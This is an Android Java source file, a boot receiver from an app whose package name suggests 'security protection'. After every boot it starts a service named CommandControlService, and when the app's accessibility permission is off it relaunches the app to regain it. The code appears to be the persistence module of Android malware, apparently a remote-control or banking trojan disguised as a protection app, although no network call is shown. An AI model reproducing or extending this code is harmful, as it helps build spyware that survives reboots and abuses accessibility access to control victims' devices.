package com.seguranca.protecao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * Receiver de inicialização do sistema — reinicia serviços após boot.
 */
public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || "android.intent.action.QUICKBOOT_POWERON".equals(action)
                || "android.intent.action.LOCKED_BOOT_COMPLETED".equals(action)) {
            
            Log.d(TAG, "Dispositivo inicializado — verificando serviços...");
            
            PermissionManager pm = new PermissionManager(context);
            
            if (pm.isAccessibilityServiceEnabled()) {
                startAllServices(context);
                Log.d(TAG, "Serviços iniciados");
            } else {
                Log.w(TAG, "Serviço de acessibilidade inativo");
                tryReactivateAccessibility(context);
            }
        }
    }

    private void startAllServices(Context context) {
        Intent ccIntent = new Intent(context, CommandControlService.class);
        startServiceCompat(context, ccIntent);
    }

    private void startServiceCompat(Context context, Intent intent) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar serviço: " + e.getMessage());
        }
    }

    private void tryReactivateAccessibility(Context context) {
        try {
            Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(launchIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao tentar reativar: " + e.getMessage());
        }
    }
}
